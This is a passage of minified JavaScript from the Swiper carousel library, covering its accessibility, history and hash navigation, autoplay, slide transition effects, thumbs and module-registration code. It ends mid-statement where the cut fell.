x=e.children("."+i.slidePrevClass);x.length>0&&t.lazy.loadInSlide(c(x))}}},it={LinearSpline:function(t,e){var i,n,r,a,o;return this.x=t,this.y=e,this.lastIndex=t.length-1,this.interpolate=function(t){return t?(o=function(t,e){for(n=-1,i=t.length;i-n>1;)t[r=i+n>>1]<=e?n=r:i=r;return i}(this.x,t),a=o-1,(t-this.x[a])*(this.y[o]-this.y[a])/(this.x[o]-this.x[a])+this.y[a]):0},this},getInterpolateFunction:function(t){this.controller.spline||(this.controller.spline=this.params.loop?new it.LinearSpline(this.slidesGrid,t.slidesGrid):new it.LinearSpline(this.snapGrid,t.snapGrid))},setTranslate:function(t,e){var i,n,r=this,a=r.controller.control,o=r.constructor;function s(t){var e=r.rtlTranslate?-r.translate:r.translate;"slide"===r.params.controller.by&&(r.controller.getInterpolateFunction(t),n=-r.controller.spline.interpolate(-e)),n&&"container"!==r.params.controller.by||(i=(t.maxTranslate()-t.minTranslate())/(r.maxTranslate()-r.minTranslate()),n=(e-r.minTranslate())*i+t.minTranslate()),r.params.controller.inverse&&(n=t.maxTranslate()-n),t.updateProgress(n),t.setTranslate(n,r),t.updateActiveIndex(),t.updateSlidesClasses()}if(Array.isArray(a))for(var l=0;l<a.length;l+=1)a[l]!==e&&a[l]instanceof o&&s(a[l]);else a instanceof o&&e!==a&&s(a)},setTransition:function(t,e){var i,n=this,r=n.constructor,a=n.controller.control;function o(e){e.setTransition(t,n),0!==t&&(e.transitionStart(),e.params.autoHeight&&w((function(){e.updateAutoHeight()})),e.$wrapperEl.transitionEnd((function(){a&&(e.params.loop&&"slide"===n.params.controller.by&&e.loopFix(),e.transitionEnd())})))}if(Array.isArray(a))for(i=0;i<a.length;i+=1)a[i]!==e&&a[i]instanceof r&&o(a[i]);else a instanceof r&&e!==a&&o(a)}},nt={getRandomNumber:function(t){return void 0===t&&(t=16),"x".repeat(t).replace(/x/g,(function(){return Math.round(16*Math.random()).toString(16)}))},makeElFocusable:function(t){return t.attr("tabIndex","0"),t},makeElNotFocusable:function(t){return t.attr("tabIndex","-1"),t},addElRole:function(t,e){return t.attr("role",e),t},addElRoleDescription:function(t,e){return t.attr("aria-role-description",e),t},addElControls:function(t,e){return t.attr("aria-controls",e),t},addElLabel:function(t,e){return t.attr("aria-label",e),t},addElId:function(t,e){return t.attr("id",e),t},addElLive:function(t,e){return t.attr("aria-live",e),t},disableEl:function(t){return t.attr("aria-disabled",!0),t},enableEl:function(t){return t.attr("aria-disabled",!1),t},onEnterKey:function(t){var e=this.params.a11y;if(13===t.keyCode){var i=g(t.target);this.navigation&&this.navigation.$nextEl&&i.is(this.navigation.$nextEl)&&(this.isEnd&&!this.params.loop||this.slideNext(),this.isEnd?this.a11y.notify(e.lastSlideMessage):this.a11y.notify(e.nextSlideMessage)),this.navigation&&this.navigation.$prevEl&&i.is(this.navigation.$prevEl)&&(this.isBeginning&&!this.params.loop||this.slidePrev(),this.isBeginning?this.a11y.notify(e.firstSlideMessage):this.a11y.notify(e.prevSlideMessage)),this.pagination&&i.is("."+this.params.pagination.bulletClass)&&i[0].click()}},notify:function(t){var e=this.a11y.liveRegion;0!==e.length&&(e.html(""),e.html(t))},updateNavigation:function(){if(!this.params.loop&&this.navigation){var t=this.navigation,e=t.$nextEl,i=t.$prevEl;i&&i.length>0&&(this.isBeginning?(this.a11y.disableEl(i),this.a11y.makeElNotFocusable(i)):(this.a11y.enableEl(i),this.a11y.makeElFocusable(i))),e&&e.length>0&&(this.isEnd?(this.a11y.disableEl(e),this.a11y.makeElNotFocusable(e)):(this.a11y.enableEl(e),this.a11y.makeElFocusable(e)))}},updatePagination:function(){var t=this,e=t.params.a11y;t.pagination&&t.params.pagination.clickable&&t.pagination.bullets&&t.pagination.bullets.length&&t.pagination.bullets.each((function(i){var n=g(i);t.a11y.makeElFocusable(n),t.params.pagination.renderBullet||(t.a11y.addElRole(n,"button"),t.a11y.addElLabel(n,e.paginationBulletMessage.replace(/\{\{index\}\}/,n.index()+1)))}))},init:function(){var t=this,e=t.params.a11y;t.$el.append(t.a11y.liveRegion);var i=t.$el;e.containerRoleDescriptionMessage&&t.a11y.addElRoleDescription(i,e.containerRoleDescriptionMessage),e.containerMessage&&t.a11y.addElLabel(i,e.containerMessage);var n,r,a,o=t.$wrapperEl,s=o.attr("id")||"swiper-wrapper-"+t.a11y.getRandomNumber(16);t.a11y.addElId(o,s),n=t.params.autoplay&&t.params.autoplay.enabled?"off":"polite",t.a11y.addElLive(o,n),e.itemRoleDescriptionMessage&&t.a11y.addElRoleDescription(g(t.slides),e.itemRoleDescriptionMessage),t.a11y.addElRole(g(t.slides),"group"),t.slides.each((function(e){var i=g(e);t.a11y.addElLabel(i,i.index()+1+" / "+t.slides.length)})),t.navigation&&t.navigation.$nextEl&&(r=t.navigation.$nextEl),t.navigation&&t.navigation.$prevEl&&(a=t.navigation.$prevEl),r&&r.length&&(t.a11y.makeElFocusable(r),"BUTTON"!==r[0].tagName&&(t.a11y.addElRole(r,"button"),r.on("keydown",t.a11y.onEnterKey)),t.a11y.addElLabel(r,e.nextSlideMessage),t.a11y.addElControls(r,s)),a&&a.length&&(t.a11y.makeElFocusable(a),"BUTTON"!==a[0].tagName&&(t.a11y.addElRole(a,"button"),a.on("keydown",t.a11y.onEnterKey)),t.a11y.addElLabel(a,e.prevSlideMessage),t.a11y.addElControls(a,s)),t.pagination&&t.params.pagination.clickable&&t.pagination.bullets&&t.pagination.bullets.length&&t.pagination.$el.on("keydown","."+t.params.pagination.bulletClass,t.a11y.onEnterKey)},destroy:function(){var t,e;this.a11y.liveRegion&&this.a11y.liveRegion.length>0&&this.a11y.liveRegion.remove(),this.navigation&&this.navigation.$nextEl&&(t=this.navigation.$nextEl),this.navigation&&this.navigation.$prevEl&&(e=this.navigation.$prevEl),t&&t.off("keydown",this.a11y.onEnterKey),e&&e.off("keydown",this.a11y.onEnterKey),this.pagination&&this.params.pagination.clickable&&this.pagination.bullets&&this.pagination.bullets.length&&this.pagination.$el.off("keydown","."+this.params.pagination.bulletClass,this.a11y.onEnterKey)}},rt={init:function(){var t=s();if(this.params.history){if(!t.history||!t.history.pushState)return this.params.history.enabled=!1,void(this.params.hashNavigation.enabled=!0);var e=this.history;e.initialized=!0,e.paths=rt.getPathValues(this.params.url),(e.paths.key||e.paths.value)&&(e.scrollToSlide(0,e.paths.value,this.params.runCallbacksOnInit),this.params.history.replaceState||t.addEventListener("popstate",this.history.setHistoryPopState))}},destroy:function(){var t=s();this.params.history.replaceState||t.removeEventListener("popstate",this.history.setHistoryPopState)},setHistoryPopState:function(){this.history.paths=rt.getPathValues(this.params.url),this.history.scrollToSlide(this.params.speed,this.history.paths.value,!1)},getPathValues:function(t){var e=s(),i=(t?new URL(t):e.location).pathname.slice(1).split("/").filter((function(t){return""!==t})),n=i.length;return{key:i[n-2],value:i[n-1]}},setHistory:function(t,e){var i=s();if(this.history.initialized&&this.params.history.enabled){var n;n=this.params.url?new URL(this.params.url):i.location;var r=this.slides.eq(e),a=rt.slugify(r.attr("data-history"));n.pathname.includes(t)||(a=t+"/"+a);var o=i.history.state;o&&o.value===a||(this.params.history.replaceState?i.history.replaceState({value:a},null,a):i.history.pushState({value:a},null,a))}},slugify:function(t){return t.toString().replace(/\s+/g,"-").replace(/[^\w-]+/g,"").replace(/--+/g,"-").replace(/^-+/,"").replace(/-+$/,"")},scrollToSlide:function(t,e,i){if(e)for(var n=0,r=this.slides.length;n<r;n+=1){var a=this.slides.eq(n);if(rt.slugify(a.attr("data-history"))===e&&!a.hasClass(this.params.slideDuplicateClass)){var o=a.index();this.slideTo(o,t,i)}}else this.slideTo(0,t,i)}},at={onHashCange:function(){var t=a();this.emit("hashChange");var e=t.location.hash.replace("#","");if(e!==this.slides.eq(this.activeIndex).attr("data-hash")){var i=this.$wrapperEl.children("."+this.params.slideClass+'[data-hash="'+e+'"]').index();if(void 0===i)return;this.slideTo(i)}},setHash:function(){var t=s(),e=a();if(this.hashNavigation.initialized&&this.params.hashNavigation.enabled)if(this.params.hashNavigation.replaceState&&t.history&&t.history.replaceState)t.history.replaceState(null,null,"#"+this.slides.eq(this.activeIndex).attr("data-hash")||""),this.emit("hashSet");else{var i=this.slides.eq(this.activeIndex),n=i.attr("data-hash")||i.attr("data-history");e.location.hash=n||"",this.emit("hashSet")}},init:function(){var t=a(),e=s();if(!(!this.params.hashNavigation.enabled||this.params.history&&this.params.history.enabled)){this.hashNavigation.initialized=!0;var i=t.location.hash.replace("#","");if(i)for(var n=0,r=this.slides.length;n<r;n+=1){var o=this.slides.eq(n);if((o.attr("data-hash")||o.attr("data-history"))===i&&!o.hasClass(this.params.slideDuplicateClass)){var l=o.index();this.slideTo(l,0,this.params.runCallbacksOnInit,!0)}}this.params.hashNavigation.watchState&&g(e).on("hashchange",this.hashNavigation.onHashCange)}},destroy:function(){var t=s();this.params.hashNavigation.watchState&&g(t).off("hashchange",this.hashNavigation.onHashCange)}},ot={run:function(){var t=this,e=t.slides.eq(t.activeIndex),i=t.params.autoplay.delay;e.attr("data-swiper-autoplay")&&(i=e.attr("data-swiper-autoplay")||t.params.autoplay.delay),clearTimeout(t.autoplay.timeout),t.autoplay.timeout=w((function(){var e;t.params.autoplay.reverseDirection?t.params.loop?(t.loopFix(),e=t.slidePrev(t.params.speed,!0,!0),t.emit("autoplay")):t.isBeginning?t.params.autoplay.stopOnLastSlide?t.autoplay.stop():(e=t.slideTo(t.slides.length-1,t.params.speed,!0,!0),t.emit("autoplay")):(e=t.slidePrev(t.params.speed,!0,!0),t.emit("autoplay")):t.params.loop?(t.loopFix(),e=t.slideNext(t.params.speed,!0,!0),t.emit("autoplay")):t.isEnd?t.params.autoplay.stopOnLastSlide?t.autoplay.stop():(e=t.slideTo(0,t.params.speed,!0,!0),t.emit("autoplay")):(e=t.slideNext(t.params.speed,!0,!0),t.emit("autoplay")),(t.params.cssMode&&t.autoplay.running||!1===e)&&t.autoplay.run()}),i)},start:function(){return void 0===this.autoplay.timeout&&!this.autoplay.running&&(this.autoplay.running=!0,this.emit("autoplayStart"),this.autoplay.run(),!0)},stop:function(){return!!this.autoplay.running&&void 0!==this.autoplay.timeout&&(this.autoplay.timeout&&(clearTimeout(this.autoplay.timeout),this.autoplay.timeout=void 0),this.autoplay.running=!1,this.emit("autoplayStop"),!0)},pause:function(t){this.autoplay.running&&(this.autoplay.paused||(this.autoplay.timeout&&clearTimeout(this.autoplay.timeout),this.autoplay.paused=!0,0!==t&&this.params.autoplay.waitForTransition?(this.$wrapperEl[0].addEventListener("transitionend",this.autoplay.onTransitionEnd),this.$wrapperEl[0].addEventListener("webkitTransitionEnd",this.autoplay.onTransitionEnd)):(this.autoplay.paused=!1,this.autoplay.run())))},onVisibilityChange:function(){var t=a();"hidden"===t.visibilityState&&this.autoplay.running&&this.autoplay.pause(),"visible"===t.visibilityState&&this.autoplay.paused&&(this.autoplay.run(),this.autoplay.paused=!1)},onTransitionEnd:function(t){this&&!this.destroyed&&this.$wrapperEl&&t.target===this.$wrapperEl[0]&&(this.$wrapperEl[0].removeEventListener("transitionend",this.autoplay.onTransitionEnd),this.$wrapperEl[0].removeEventListener("webkitTransitionEnd",this.autoplay.onTransitionEnd),this.autoplay.paused=!1,this.autoplay.running?this.autoplay.run():this.autoplay.stop())}},st={setTranslate:function(){for(var t=this.slides,e=0;e<t.length;e+=1){var i=this.slides.eq(e),n=-i[0].swiperSlideOffset;this.params.virtualTranslate||(n-=this.translate);var r=0;this.isHorizontal()||(r=n,n=0);var a=this.params.fadeEffect.crossFade?Math.max(1-Math.abs(i[0].progress),0):1+Math.min(Math.max(i[0].progress,-1),0);i.css({opacity:a}).transform("translate3d("+n+"px, "+r+"px, 0px)")}},setTransition:function(t){var e=this,i=e.slides,n=e.$wrapperEl;if(i.transition(t),e.params.virtualTranslate&&0!==t){var r=!1;i.transitionEnd((function(){if(!r&&e&&!e.destroyed){r=!0,e.animating=!1;for(var t=["webkitTransitionEnd","transitionend"],i=0;i<t.length;i+=1)n.trigger(t[i])}}))}}},lt={setTranslate:function(){var t,e=this.$el,i=this.$wrapperEl,n=this.slides,r=this.width,a=this.height,o=this.rtlTranslate,s=this.size,l=this.browser,c=this.params.cubeEffect,h=this.isHorizontal(),u=this.virtual&&this.params.virtual.enabled,d=0;c.shadow&&(h?(0===(t=i.find(".swiper-cube-shadow")).length&&(t=g('<div class="swiper-cube-shadow"></div>'),i.append(t)),t.css({height:r+"px"})):0===(t=e.find(".swiper-cube-shadow")).length&&(t=g('<div class="swiper-cube-shadow"></div>'),e.append(t)));for(var p=0;p<n.length;p+=1){var f=n.eq(p),m=p;u&&(m=parseInt(f.attr("data-swiper-slide-index"),10));var v=90*m,y=Math.floor(v/360);o&&(v=-v,y=Math.floor(-v/360));var x=Math.max(Math.min(f[0].progress,1),-1),b=0,w=0,_=0;m%4==0?(b=4*-y*s,_=0):(m-1)%4==0?(b=0,_=4*-y*s):(m-2)%4==0?(b=s+4*y*s,_=s):(m-3)%4==0&&(b=-s,_=3*s+4*s*y),o&&(b=-b),h||(w=b,b=0);var M="rotateX("+(h?0:-v)+"deg) rotateY("+(h?v:0)+"deg) translate3d("+b+"px, "+w+"px, "+_+"px)";if(x<=1&&x>-1&&(d=90*m+90*x,o&&(d=90*-m-90*x)),f.transform(M),c.slideShadows){var S=h?f.find(".swiper-slide-shadow-left"):f.find(".swiper-slide-shadow-top"),T=h?f.find(".swiper-slide-shadow-right"):f.find(".swiper-slide-shadow-bottom");0===S.length&&(S=g('<div class="swiper-slide-shadow-'+(h?"left":"top")+'"></div>'),f.append(S)),0===T.length&&(T=g('<div class="swiper-slide-shadow-'+(h?"right":"bottom")+'"></div>'),f.append(T)),S.length&&(S[0].style.opacity=Math.max(-x,0)),T.length&&(T[0].style.opacity=Math.max(x,0))}}if(i.css({"-webkit-transform-origin":"50% 50% -"+s/2+"px","-moz-transform-origin":"50% 50% -"+s/2+"px","-ms-transform-origin":"50% 50% -"+s/2+"px","transform-origin":"50% 50% -"+s/2+"px"}),c.shadow)if(h)t.transform("translate3d(0px, "+(r/2+c.shadowOffset)+"px, "+-r/2+"px) rotateX(90deg) rotateZ(0deg) scale("+c.shadowScale+")");else{var E=Math.abs(d)-90*Math.floor(Math.abs(d)/90),C=1.5-(Math.sin(2*E*Math.PI/360)/2+Math.cos(2*E*Math.PI/360)/2),A=c.shadowScale,L=c.shadowScale/C,P=c.shadowOffset;t.transform("scale3d("+A+", 1, "+L+") translate3d(0px, "+(a/2+P)+"px, "+-a/2/L+"px) rotateX(-90deg)")}var R=l.isSafari||l.isWebView?-s/2:0;i.transform("translate3d(0px,0,"+R+"px) rotateX("+(this.isHorizontal()?0:d)+"deg) rotateY("+(this.isHorizontal()?-d:0)+"deg)")},setTransition:function(t){var e=this.$el;this.slides.transition(t).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(t),this.params.cubeEffect.shadow&&!this.isHorizontal()&&e.find(".swiper-cube-shadow").transition(t)}},ct={setTranslate:function(){for(var t=this.slides,e=this.rtlTranslate,i=0;i<t.length;i+=1){var n=t.eq(i),r=n[0].progress;this.params.flipEffect.limitRotation&&(r=Math.max(Math.min(n[0].progress,1),-1));var a=-180*r,o=0,s=-n[0].swiperSlideOffset,l=0;if(this.isHorizontal()?e&&(a=-a):(l=s,s=0,o=-a,a=0),n[0].style.zIndex=-Math.abs(Math.round(r))+t.length,this.params.flipEffect.slideShadows){var c=this.isHorizontal()?n.find(".swiper-slide-shadow-left"):n.find(".swiper-slide-shadow-top"),h=this.isHorizontal()?n.find(".swiper-slide-shadow-right"):n.find(".swiper-slide-shadow-bottom");0===c.length&&(c=g('<div class="swiper-slide-shadow-'+(this.isHorizontal()?"left":"top")+'"></div>'),n.append(c)),0===h.length&&(h=g('<div class="swiper-slide-shadow-'+(this.isHorizontal()?"right":"bottom")+'"></div>'),n.append(h)),c.length&&(c[0].style.opacity=Math.max(-r,0)),h.length&&(h[0].style.opacity=Math.max(r,0))}n.transform("translate3d("+s+"px, "+l+"px, 0px) rotateX("+o+"deg) rotateY("+a+"deg)")}},setTransition:function(t){var e=this,i=e.slides,n=e.activeIndex,r=e.$wrapperEl;if(i.transition(t).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(t),e.params.virtualTranslate&&0!==t){var a=!1;i.eq(n).transitionEnd((function(){if(!a&&e&&!e.destroyed){a=!0,e.animating=!1;for(var t=["webkitTransitionEnd","transitionend"],i=0;i<t.length;i+=1)r.trigger(t[i])}}))}}},ht={setTranslate:function(){for(var t=this.width,e=this.height,i=this.slides,n=this.slidesSizesGrid,r=this.params.coverflowEffect,a=this.isHorizontal(),o=this.translate,s=a?t/2-o:e/2-o,l=a?r.rotate:-r.rotate,c=r.depth,h=0,u=i.length;h<u;h+=1){var d=i.eq(h),p=n[h],f=(s-d[0].swiperSlideOffset-p/2)/p*r.modifier,m=a?l*f:0,v=a?0:l*f,y=-c*Math.abs(f),x=r.stretch;"string"==typeof x&&-1!==x.indexOf("%")&&(x=parseFloat(r.stretch)/100*p);var b=a?0:x*f,w=a?x*f:0,_=1-(1-r.scale)*Math.abs(f);Math.abs(w)<.001&&(w=0),Math.abs(b)<.001&&(b=0),Math.abs(y)<.001&&(y=0),Math.abs(m)<.001&&(m=0),Math.abs(v)<.001&&(v=0),Math.abs(_)<.001&&(_=0);var M="translate3d("+w+"px,"+b+"px,"+y+"px)  rotateX("+v+"deg) rotateY("+m+"deg) scale("+_+")";if(d.transform(M),d[0].style.zIndex=1-Math.abs(Math.round(f)),r.slideShadows){var S=a?d.find(".swiper-slide-shadow-left"):d.find(".swiper-slide-shadow-top"),T=a?d.find(".swiper-slide-shadow-right"):d.find(".swiper-slide-shadow-bottom");0===S.length&&(S=g('<div class="swiper-slide-shadow-'+(a?"left":"top")+'"></div>'),d.append(S)),0===T.length&&(T=g('<div class="swiper-slide-shadow-'+(a?"right":"bottom")+'"></div>'),d.append(T)),S.length&&(S[0].style.opacity=f>0?f:0),T.length&&(T[0].style.opacity=-f>0?-f:0)}}},setTransition:function(t){this.slides.transition(t).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(t)}},ut={init:function(){var t=this.params.thumbs;if(this.thumbs.initialized)return!1;this.thumbs.initialized=!0;var e=this.constructor;return t.swiper instanceof e?(this.thumbs.swiper=t.swiper,T(this.thumbs.swiper.originalParams,{watchSlidesProgress:!0,slideToClickedSlide:!1}),T(this.thumbs.swiper.params,{watchSlidesProgress:!0,slideToClickedSlide:!1})):S(t.swiper)&&(this.thumbs.swiper=new e(T({},t.swiper,{watchSlidesVisibility:!0,watchSlidesProgress:!0,slideToClickedSlide:!1})),this.thumbs.swiperCreated=!0),this.thumbs.swiper.$el.addClass(this.params.thumbs.thumbsContainerClass),this.thumbs.swiper.on("tap",this.thumbs.onThumbClick),!0},onThumbClick:function(){var t=this.thumbs.swiper;if(t){var e=t.clickedIndex,i=t.clickedSlide;if(!(i&&g(i).hasClass(this.params.thumbs.slideThumbActiveClass)||null==e)){var n;if(n=t.params.loop?parseInt(g(t.clickedSlide).attr("data-swiper-slide-index"),10):e,this.params.loop){var r=this.activeIndex;this.slides.eq(r).hasClass(this.params.slideDuplicateClass)&&(this.loopFix(),this._clientLeft=this.$wrapperEl[0].clientLeft,r=this.activeIndex);var a=this.slides.eq(r).prevAll('[data-swiper-slide-index="'+n+'"]').eq(0).index(),o=this.slides.eq(r).nextAll('[data-swiper-slide-index="'+n+'"]').eq(0).index();n=void 0===a?o:void 0===o?a:o-r<r-a?o:a}this.slideTo(n)}}},update:function(t){var e=this.thumbs.swiper;if(e){var i="auto"===e.params.slidesPerView?e.slidesPerViewDynamic():e.params.slidesPerView,n=this.params.thumbs.autoScrollOffset,r=n&&!e.params.loop;if(this.realIndex!==e.realIndex||r){var a,o,s=e.activeIndex;if(e.params.loop){e.slides.eq(s).hasClass(e.params.slideDuplicateClass)&&(e.loopFix(),e._clientLeft=e.$wrapperEl[0].clientLeft,s=e.activeIndex);var l=e.slides.eq(s).prevAll('[data-swiper-slide-index="'+this.realIndex+'"]').eq(0).index(),c=e.slides.eq(s).nextAll('[data-swiper-slide-index="'+this.realIndex+'"]').eq(0).index();a=void 0===l?c:void 0===c?l:c-s==s-l?s:c-s<s-l?c:l,o=this.activeIndex>this.previousIndex?"next":"prev"}else o=(a=this.realIndex)>this.previousIndex?"next":"prev";r&&(a+="next"===o?n:-1*n),e.visibleSlidesIndexes&&e.visibleSlidesIndexes.indexOf(a)<0&&(e.params.centeredSlides?a=a>s?a-Math.floor(i/2)+1:a+Math.floor(i/2)-1:a>s&&(a=a-i+1),e.slideTo(a,t?0:void 0))}var h=1,u=this.params.thumbs.slideThumbActiveClass;if(this.params.slidesPerView>1&&!this.params.centeredSlides&&(h=this.params.slidesPerView),this.params.thumbs.multipleActiveThumbs||(h=1),h=Math.floor(h),e.slides.removeClass(u),e.params.loop||e.params.virtual&&e.params.virtual.enabled)for(var d=0;d<h;d+=1)e.$wrapperEl.children('[data-swiper-slide-index="'+(this.realIndex+d)+'"]').addClass(u);else for(var p=0;p<h;p+=1)e.slides.eq(this.realIndex+p).addClass(u)}}},dt=[q,Y,{name:"mousewheel",params:{mousewheel:{enabled:!1,releaseOnEdges:!1,invert:!1,forceToAxis:!1,sensitivity:1,eventsTarget:"container",thresholdDelta:null,thresholdTime:null}},create:function(){E(this,{mousewheel:{enabled:!1,lastScrollTime:_(),lastEventBeforeSnap:void 0,recentWheelEvents:[],enable:$.enable,disable:$.disable,handle:$.handle,handleMouseEnter:$.handleMouseEnter,handleMouseLeave:$.handleMouseLeave,animateSlider:$.animateSlider,releaseScroll:$.releaseScroll}})},on:{init:function(t){!t.params.mousewheel.enabled&&t.params.cssMode&&t.mousewheel.disable(),t.params.mousewheel.enabled&&t.mousewheel.enable()},destroy:function(t){t.params.cssMode&&t.mousewheel.enable(),t.mousewheel.enabled&&t.mousewheel.disable()}}},{name:"navigation",params:{navigation:{nextEl:null,prevEl:null,hideOnClick:!1,disabledClass:"swiper-button-disabled",hiddenClass:"swiper-button-hidden",lockClass:"swiper-button-lock"}},create:function(){E(this,{navigation:e({},Z)})},on:{init:function(t){t.navigation.init(),t.navigation.update()},toEdge:function(t){t.navigation.update()},fromEdge:function(t){t.navigation.update()},destroy:function(t){t.navigation.destroy()},click:function(t,e){var i,n=t.navigation,r=n.$nextEl,a=n.$prevEl;!t.params.navigation.hideOnClick||g(e.target).is(a)||g(e.target).is(r)||(r?i=r.hasClass(t.params.navigation.hiddenClass):a&&(i=a.hasClass(t.params.navigation.hiddenClass)),!0===i?t.emit("navigationShow"):t.emit("navigationHide"),r&&r.toggleClass(t.params.navigation.hiddenClass),a&&a.toggleClass(t.params.navigation.hiddenClass))}}},{name:"pagination",params:{pagination:{el:null,bulletElement:"span",clickable:!1,hideOnClick:!1,renderBullet:null,renderProgressbar:null,renderFraction:null,renderCustom:null,progressbarOpposite:!1,type:"bullets",dynamicBullets:!1,dynamicMainBullets:1,formatFractionCurrent:function(t){return t},formatFractionTotal:function(t){return t},bulletClass:"swiper-pagination-bullet",bulletActiveClass:"swiper-pagination-bullet-active",modifierClass:"swiper-pagination-",currentClass:"swiper-pagination-current",totalClass:"swiper-pagination-total",hiddenClass:"swiper-pagination-hidden",progressbarFillClass:"swiper-pagination-progressbar-fill",progressbarOppositeClass:"swiper-pagination-progressbar-opposite",clickableClass:"swiper-pagination-clickable",lockClass:"swiper-pagination-lock"}},create:function(){E(this,{pagination:e({dynamicBulletIndex:0},J)})},on:{init:function(t){t.pagination.init(),t.pagination.render(),t.pagination.update()},activeIndexChange:function(t){(t.params.loop||void 0===t.snapIndex)&&t.pagination.update()},snapIndexChange:function(t){t.params.loop||t.pagination.update()},slidesLengthChange:function(t){t.params.loop&&(t.pagination.render(),t.pagination.update())},snapGridLengthChange:function(t){t.params.loop||(t.pagination.render(),t.pagination.update())},destroy:function(t){t.pagination.destroy()},click:function(t,e){t.params.pagination.el&&t.params.pagination.hideOnClick&&t.pagination.$el.length>0&&!g(e.target).hasClass(t.params.pagination.bulletClass)&&(!0===t.pagination.$el.hasClass(t.params.pagination.hiddenClass)?t.emit("paginationShow"):t.emit("paginationHide"),t.pagination.$el.toggleClass(t.params.pagination.hiddenClass))}}},{name:"scrollbar",params:{scrollbar:{el:null,dragSize:"auto",hide:!1,draggable:!1,snapOnRelease:!0,lockClass:"swiper-scrollbar-lock",dragClass:"swiper-scrollbar-drag"}},create:function(){E(this,{scrollbar:e({isTouched:!1,timeout:null,dragTimeout:null},K)})},on:{init:function(t){t.scrollbar.init(),t.scrollbar.updateSize(),t.scrollbar.setTranslate()},update:function(t){t.scrollbar.updateSize()},resize:function(t){t.scrollbar.updateSize()},observerUpdate:function(t){t.scrollbar.updateSize()},setTranslate:function(t){t.scrollbar.setTranslate()},setTransition:function(t,e){t.scrollbar.setTransition(e)},destroy:function(t){t.scrollbar.destroy()}}},{name:"parallax",params:{parallax:{enabled:!1}},create:function(){E(this,{parallax:e({},Q)})},on:{beforeInit:function(t){t.params.parallax.enabled&&(t.params.watchSlidesProgress=!0,t.originalParams.watchSlidesProgress=!0)},init:function(t){t.params.parallax.enabled&&t.parallax.setTranslate()},setTranslate:function(t){t.params.parallax.enabled&&t.parallax.setTranslate()},setTransition:function(t,e){t.params.parallax.enabled&&t.parallax.setTransition(e)}}},{name:"zoom",params:{zoom:{enabled:!1,maxRatio:3,minRatio:1,toggle:!0,containerClass:"swiper-zoom-container",zoomedSlideClass:"swiper-slide-zoomed"}},create:function(){var t=this;E(t,{zoom:e({enabled:!1,scale:1,currentScale:1,isScaling:!1,gesture:{$slideEl:void 0,slideWidth:void 0,slideHeight:void 0,$imageEl:void 0,$imageWrapEl:void 0,maxRatio:3},image:{isTouched:void 0,isMoved:void 0,currentX:void 0,currentY:void 0,minX:void 0,minY:void 0,maxX:void 0,maxY:void 0,width:void 0,height:void 0,startX:void 0,startY:void 0,touchesStart:{},touchesCurrent:{}},velocity:{x:void 0,y:void 0,prevPositionX:void 0,prevPositionY:void 0,prevTime:void 0}},tt)});var i=1;Object.defineProperty(t.zoom,"scale",{get:function(){return i},set:function(e){if(i!==e){var n=t.zoom.gesture.$imageEl?t.zoom.gesture.$imageEl[0]:void 0,r=t.zoom.gesture.$slideEl?t.zoom.gesture.$slideEl[0]:void 0;t.emit("zoomChange",e,n,r)}i=e}})},on:{init:function(t){t.params.zoom.enabled&&t.zoom.enable()},destroy:function(t){t.zoom.disable()},touchStart:function(t,e){t.zoom.enabled&&t.zoom.onTouchStart(e)},touchEnd:function(t,e){t.zoom.enabled&&t.zoom.onTouchEnd(e)},doubleTap:function(t,e){t.params.zoom.enabled&&t.zoom.enabled&&t.params.zoom.toggle&&t.zoom.toggle(e)},transitionEnd:function(t){t.zoom.enabled&&t.params.zoom.enabled&&t.zoom.onTransitionEnd()},slideChange:function(t){t.zoom.enabled&&t.params.zoom.enabled&&t.params.cssMode&&t.zoom.onTransitionEnd()}}},{name:"lazy",params:{lazy:{enabled:!1,loadPrevNext:!1,loadPrevNextAmount:1,loadOnTransitionStart:!1,elementClass:"swiper-lazy",loadingClass:"swiper-lazy-loading",loadedClass:"swiper-lazy-loaded",preloaderClass:"swiper-lazy-preloader"}},create:function(){E(this,{lazy:e({initialImageLoaded:!1},et)})},on:{beforeInit:function(t){t.params.lazy.enabled&&t.params.preloadImages&&(t.params.preloadImages=!1)},init:function(t){t.params.lazy.enabled&&!t.params.loop&&0===t.params.initialSlide&&t.lazy.load()},scroll:function(t){t.params.freeMode&&!t.params.freeModeSticky&&t.lazy.load()},resize:function(t){t.params.lazy.enabled&&t.lazy.load()},scrollbarDragMove:function(t){t.params.lazy.enabled&&t.lazy.load()},transitionStart:function(t){t.params.lazy.enabled&&(t.params.lazy.loadOnTransitionStart||!t.params.lazy.loadOnTransitionStart&&!t.lazy.initialImageLoaded)&&t.lazy.load()},transitionEnd:function(t){t.params.lazy.enabled&&!t.params.lazy.loadOnTransitionStart&&t.lazy.load()},slideChange:function(t){t.params.lazy.enabled&&t.params.cssMode&&t.lazy.load()}}},{name:"controller",params:{controller:{control:void 0,inverse:!1,by:"slide"}},create:function(){E(this,{controller:e({control:this.params.controller.control},it)})},on:{update:function(t){t.controller.control&&t.controller.spline&&(t.controller.spline=void 0,delete t.controller.spline)},resize:function(t){t.controller.control&&t.controller.spline&&(t.controller.spline=void 0,delete t.controller.spline)},observerUpdate:function(t){t.controller.control&&t.controller.spline&&(t.controller.spline=void 0,delete t.controller.spline)},setTranslate:function(t,e,i){t.controller.control&&t.controller.setTranslate(e,i)},setTransition:function(t,e,i){t.controller.control&&t.controller.setTransition(e,i)}}},{name:"a11y",params:{a11y:{enabled:!0,notificationClass:"swiper-notification",prevSlideMessage:"Previous slide",nextSlideMessage:"Next slide",firstSlideMessage:"This is the first slide",lastSlideMessage:"This is the last slide",paginationBulletMessage:"Go to slide {{index}}",containerMessage:null,containerRoleDescriptionMessage:null,itemRoleDescriptionMessage:null}},create:function(){E(this,{a11y:e(e({},nt),{},{liveRegion:g('<span class="'+this.params.a11y.notificationClass+'" aria-live="assertive" 